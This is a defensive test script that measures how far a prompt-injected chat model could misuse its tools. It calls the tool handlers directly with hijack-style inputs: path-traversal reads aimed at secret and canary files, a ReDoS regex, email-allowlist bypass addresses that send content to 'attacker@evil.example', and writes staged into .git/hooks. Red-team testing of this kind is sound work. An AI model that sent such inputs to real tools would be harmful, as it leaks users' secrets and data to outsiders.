"""
Prompt-injection blast radius: call the chat LLM's tool handlers directly
with the inputs a hijacked model would send. News watch pulls public web text
into inbox.md, which reaches the chat context — so anyone who can get an
article indexed can try to steer these tools. No API key needed.

    uv run python tooling/sandbox/attack_ai_tools.py
"""

import sqlite3
import sys
import time

import sandbox_env as sb

sb.apply_env()
sb.seed()

import local_db  # noqa: E402
import tools_registry  # noqa: E402

RESULTS = []


def report(status, name, detail=""):
    RESULTS.append(status)
    colour = {"BLOCKED": "\033[32m", "VULN": "\033[31m", "INFO": "\033[33m"}[status]
    print(f"{colour}{status:8}\033[0m {name}" + (f"  — {detail}" if detail else ""))


def leaked(text):
    for c in (sb.CANARY_OUT, sb.CANARY_DB, sb.CANARY_SRC):
        if c in text:
            return c
    if "AUTH_SECRET_KEY" in text or "ANTHROPIC_API_KEY" in text:
        return "secrets-shaped content"
    return None


def main():
    local_db.init_db()
    conn = local_db.get_db()
    staged = []
    tools = {t.name: t.handler for t in tools_registry.build_tools(conn, staged)}

    reads = {
        "read_file": ["../outside.md", "../../outside.md", "db/leak.md", "VIT/../db/leak.md",
                      "../../../code/backend/secrets_app.py", "../../secrets_app.py"],
        "read_src": ["../backend/secrets_app.py", "../backend/config.py", "../../.sandbox/secrets_app.py",
                     "../../../.sandbox/outside.md"],
        "grep": [{"pattern": "CANARY", "path": ".."}, {"pattern": "CANARY", "path": "db"},
                 {"pattern": "CANARY", "path": "../.."}],
        "list_files": [{"path": ".."}, {"path": "db"}],
        "list_src": [{"path": ".."}, {"path": "../backend"}],
        "load_skill": ["../../backend/config", "../SystemPrompt", "..\\..\\..\\.sandbox\\outside"],
    }
    for tool, inputs in reads.items():
        hits = []
        for inp in inputs:
            if isinstance(inp, str):
                key = {"load_skill": "name"}.get(tool, "path")
                inp = {key: inp}
            try:
                out = tools[tool](inp)
            except Exception as e:  # a crash is not a leak
                out = f"[exception {type(e).__name__}]"
            c = leaked(str(out))
            if c:
                hits.append(f"{inp} -> {c}")
        report("VULN" if hits else "BLOCKED", f"Injected {tool}() escaping its root", "; ".join(hits))

    # ReDoS — catastrophic backtracking inside the 200-char cap.
    (sb.USER_ROOT / "redos.md").write_text("a" * 28 + "!\n", encoding="utf-8")
    t0 = time.perf_counter()
    tools["grep"]({"pattern": "(a+)+$"})
    dt = time.perf_counter() - t0
    report("VULN" if dt > 2 else "INFO", "grep ReDoS with (a+)+$ on a 29-char line",
           f"{dt:.1f}s of CPU in the web process" + (" — scales exponentially per char" if dt > 2 else ""))
    (sb.USER_ROOT / "redos.md").unlink()

    # Email exfiltration — the allowlist is an endswith("@smtw.in") check.
    tricks = ["attacker@evil.example", "attacker@evil.example,owner@smtw.in",
              "attacker@evil.example;owner@smtw.in", "\"owner@smtw.in\" <attacker@evil.example>",
              "attacker@evil.example (owner@smtw.in)", "attacker@evil.example\nowner@smtw.in",
              "anyone-at-all@smtw.in"]
    before = conn.execute("SELECT COUNT(*) FROM task_queue WHERE task_type='email'").fetchone()[0]
    passed = [t for t in tricks if "queued" in tools["send_email"](
        {"to": t, "subject": "notes", "body": sb.CANARY_IN})]
    conn.commit()
    after = conn.execute("SELECT COUNT(*) FROM task_queue WHERE task_type='email'").fetchone()[0]
    bad = [t for t in passed if t != "anyone-at-all@smtw.in"]
    report("VULN" if bad else "BLOCKED", "send_email allowlist bypass",
           f"accepted: {bad}" if bad else "only single @smtw.in addresses accepted")
    report("INFO", "Hijacked AI can email any @smtw.in mailbox, unconfirmed",
           f"{after - before} email task(s) queued with corpus content")

    # Writes are staged, not applied — the confirm click is the real gate.
    tools["write_file"]({"path": "VIT/secret-project.md", "content": "# replaced by injection\n"})
    tools["write_file"]({"path": ".git/hooks/post-commit.md", "content": "x"})
    tools["delete_file"]({"path": "VIT/secret-project.md"})
    ok = sb.CANARY_IN in (sb.USER_ROOT / "VIT" / "secret-project.md").read_text(encoding="utf-8")
    report("BLOCKED" if ok else "VULN", "Injected write/delete applied without user confirm",
           f"{len(staged)} action(s) staged, awaiting the Apply click")
    git_staged = [s for s in staged if ".git" in str(s.get("rel_path", s))]
    report("VULN" if git_staged else "BLOCKED", "Injected write_file into .git/ accepted for staging",
           str([s.get("rel_path") for s in git_staged]) if git_staged else "")

    local_db.return_db(conn)
    print(f"\n{len(RESULTS)} checks, {RESULTS.count('VULN')} VULN")
    sys.exit(RESULTS.count("VULN"))


if __name__ == "__main__":
    main()
